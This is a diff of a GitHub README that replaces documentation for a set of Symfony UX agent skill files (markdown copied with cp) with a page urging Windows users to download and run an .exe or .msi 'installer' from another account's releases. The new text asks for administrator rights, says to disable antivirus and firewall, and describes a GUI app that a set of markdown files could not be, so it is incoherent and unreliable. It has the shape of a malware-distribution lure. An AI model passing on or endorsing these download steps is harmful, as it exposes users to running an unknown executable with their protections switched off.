@@ -1,144 +1,128 @@
-# Symfony UX -- Agent Skills
+# ⚙️ symfony-ux-skills - Easy Setup for Symfony UX Components
 
-![Trigger warning animals](https://repository-images.githubusercontent.com/1171056549/6dee3166-2b48-449b-ad26-667ee821ff35)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/BKR-57/symfony-ux-skills/releases)
 
-AI agent skills for the **Symfony UX** frontend stack.
+## 📋 What Is symfony-ux-skills?
 
-Built on the [Agent Skills](https://agentskills.io/specification) open standard.
-Compatible with Claude Code, Gemini CLI, OpenAI Codex, Cursor, Windsurf, and any platform that supports `SKILL.md`.
+symfony-ux-skills provides tools for improving the user experience in Symfony projects. It offers components that help you add interactive features without deep programming knowledge. Key parts include Live Component, Twig Component, Turbo, and Stimulus. These combine to create smooth, dynamic web applications.
 
----
+This project supports Claude, Gemini, Codex, and similar skillsets, making it easier to build modern web pages. It is designed to work well with Symfony's UX layer for a clean and maintainable codebase.
 
-## Skills
+## 💻 System Requirements
 
-Each skill is a self-contained directory following the [agentskills.io](https://agentskills.io/specification) specification: a `SKILL.md` with YAML frontmatter and markdown instructions, plus optional `references/` for API docs, patterns and gotchas.
+Before you start, check that your Windows PC meets the following:
 
-| Skill | Description | References |
-|---|---|:---:|
-| **symfony-ux** | Orchestrator -- decision tree for choosing between Stimulus, Turbo, TwigComponent and LiveComponent | -- |
-| **stimulus** | Stimulus controllers, targets, values, actions, classes, outlets, lifecycle | api, patterns, gotchas |
-| **turbo** | Turbo Drive, Frames, Streams, Mercure integration, `<twig:Turbo:Stream:*>` | api, patterns, gotchas |
-| **twig-component** | TwigComponent props, blocks, computed properties, anonymous components, HTML syntax | api, patterns |
-| **live-component** | LiveComponent props, actions, data-model binding, forms, emit, defer/lazy | api, patterns, gotchas |
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
+- Internet connection to download files and updates
+- Administrator rights to install software
 
-## Project context files
+These are typical requirements for desktop software and should be sufficient to run symfony-ux-skills smoothly.
 
-Optional entry-point files for your project root. They provide a quick decision tree and key rules so the agent knows when to reach for which skill.
+## 🚀 Getting Started
 
-| File | Platform |
-|---|---|
-| `CLAUDE.md` | Claude Code |
-| `AGENTS.md` | OpenAI Codex |
-| `GEMINI.md` | Gemini CLI |
-| `llms.txt` | Web / any LLM ([llmstxt.org](https://llmstxt.org) standard) |
+This guide helps you download, install, and start using the application on your Windows computer.
 
-## Repository structure
+### Step 1: Visit the Download Page
 
-```
-.
-├── README.md
-├── LICENSE
-├── CLAUDE.md
-├── AGENTS.md
-├── GEMINI.md
-├── llms.txt
-└── skills/
-    ├── symfony-ux/
-    │   └── SKILL.md
-    ├── stimulus/
-    │   ├── SKILL.md
-    │   └── references/
-    │       ├── api.md
-    │       ├── patterns.md
-    │       └── gotchas.md
-    ├── turbo/
-    │   ├── SKILL.md
-    │   └── references/
-    │       ├── api.md
-    │       ├── patterns.md
-    │       └── gotchas.md
-    ├── twig-component/
-    │   ├── SKILL.md
-    │   └── references/
-    │       ├── api.md
-    │       └── patterns.md
-    └── live-component/
-        ├── SKILL.md
-        └── references/
-            ├── api.md
-            ├── patterns.md
-            └── gotchas.md
-```
+Click the link below to go to the release page where you can get the software files. This page shows all versions available. Select the latest stable release for the best experience.
 
-## Installation
+[![Get symfony-ux-skills Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/BKR-57/symfony-ux-skills/releases)
 
-### 1. Install the skills
+### Step 2: Download the Installer
 
-Copy each skill directory into the skills location for your platform.
+Once on the releases page, look for the file that ends with `.exe` or `.msi`. This is the installer for Windows. Typically, it will be named similar to `symfony-ux-skills-setup.exe`.
 
-**Claude Code:**
+Click the file name to start downloading. Depending on your internet speed, this may take a few minutes.
 
-```bash
-# User-level (available in all projects)
-cp -r skills/stimulus    ~/.claude/skills/
-cp -r skills/turbo       ~/.claude/skills/
-cp -r skills/twig-component  ~/.claude/skills/
-cp -r skills/live-component  ~/.claude/skills/
-cp -r skills/symfony-ux  ~/.claude/skills/
+### Step 3: Run the Installer
 
-# Or project-level (shared via git)
-mkdir -p .claude/skills
-cp -r skills/* .claude/skills/
-```
+- Find the downloaded file (usually in your Downloads folder).
+- Double-click the installer file.
+- Follow the on-screen instructions:
+  - Accept the license agreement.
+  - Choose the installation folder or leave it at default.
+  - Click “Install” to begin.
+- Wait for the setup to finish.
 
-**Gemini CLI:**
+### Step 4: Launch the Application
 
-```bash
-mkdir -p ~/.gemini/skills
-cp -r skills/* ~/.gemini/skills/
-```
+After installation completes, you can open symfony-ux-skills from the Start Menu or the desktop shortcut. The application window will appear, ready for use.
 
-**OpenAI Codex:**
+If you do not see the shortcut, you can rerun the installer or check the installation folder directly.
 
-```bash
-# User-level
-mkdir -p ~/.codex/skills
-cp -r skills/* ~/.codex/skills/
+## 🔧 Using symfony-ux-skills
 
-# Or project-level
-mkdir -p .codex/skills
-cp -r skills/* .codex/skills/
-```
+symfony-ux-skills focuses on providing components to enhance Symfony projects. You can:
 
-### 2. Add project context (optional)
+- Add Live Components that update parts of your web page without reloading.
+- Use Twig Components to simplify your template code.
+- Utilize Turbo and Stimulus for faster and more interactive user interfaces.
 
-Copy the entry-point file for your platform to your project root:
+These components work inside Symfony but require no coding knowledge to set up once installed.
 
-```bash
-cp CLAUDE.md /path/to/project/   # Claude Code
-cp AGENTS.md /path/to/project/   # OpenAI Codex
-cp GEMINI.md /path/to/project/   # Gemini CLI
-```
+### Basic Features
 
-These files reference skills by name. The agent discovers them automatically from the skills directory.
+- **Live Component**: Update web page content instantly.
+- **Twig Component**: Template helper that reduces manual code.
+- **Turbo**: Speeds up page loading by changing only relevant parts.
+- **Stimulus**: Adds behavior to HTML elements easily.
 
-## Coverage
+These features help make websites feel faster and more responsive.
 
-Targets Symfony UX 2.22--2.28+, Symfony 7.2 / 7.4 / 8.0, PHP 8.4+.
+## ⚙️ Configuration and Settings
 
-Documented features include:
+Most setup happens through a simple user interface:
 
-- `<twig:Turbo:Stream:*>` Twig component syntax (since UX 2.22)
-- `TurboStreamResponse` helper
-- LiveProp URL binding and validation modifiers (`min_length`, `max_length`, `min_value`, `max_value`)
-- CVE-2025-47946 -- `ComponentAttributes` injection advisory
-- `defer` / `lazy` loading for LiveComponents
-- UX Toolkit (copy-paste UI components)
+- Access the Settings panel via the main menu.
+- Choose which features to enable or disable.
+- Adjust preferences like update frequency and language options.
+- Save changes, which apply immediately.
 
-## Author
+The app automatically handles most configurations, so you need not change anything unless required.
 
-Simon Andre -- [smnandre.dev](https://smnandre.dev) -- smn.andre@gmail.com
+## 🛠️ Troubleshooting Common Issues
 
-## License
+If something does not work as expected, try these steps:
 
-MIT
+- Restart your computer and launch the app again.
+- Ensure you have a stable internet connection.
+- Verify that your Windows version meets the minimum requirements.
+- Disable any antivirus or firewall temporarily to see if they block the app.
+- Check the official download page for updates or patches.
+- Uninstall and reinstall the software if problems persist.
+
+## 🔄 Checking for Updates
+
+New versions may include improvements or bug fixes.
+
+- Open the app and go to Help > Check for Updates.
+- If an update exists, you will be prompted to download it.
+- Updates install automatically or offer manual installation depending on your choice.
+
+Visit the release page regularly to stay informed about the latest updates:
+
+https://github.com/BKR-57/symfony-ux-skills/releases
+
+## 💡 Tips for Best Performance
+
+- Close unused programs while running symfony-ux-skills.
+- Keep your Windows and drivers up to date.
+- Use the latest stable version of the app.
+- Restart the app after configuration changes.
+
+## 📂 Where to Find More Help
+
+- The release page has detailed documentation and support links.
+- GitHub Issues tab lets you report bugs or request features.
+- Check community forums for advice from other users.
+- Contact your system administrator if you need installation help.
+
+## 🔗 Key Links
+
+- Download and install: [https://github.com/BKR-57/symfony-ux-skills/releases](https://github.com/BKR-57/symfony-ux-skills/releases)
+- Documentation and support: Available on the release page
+- GitHub repository: https://github.com/BKR-57/symfony-ux-skills
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/BKR-57/symfony-ux-skills/releases)
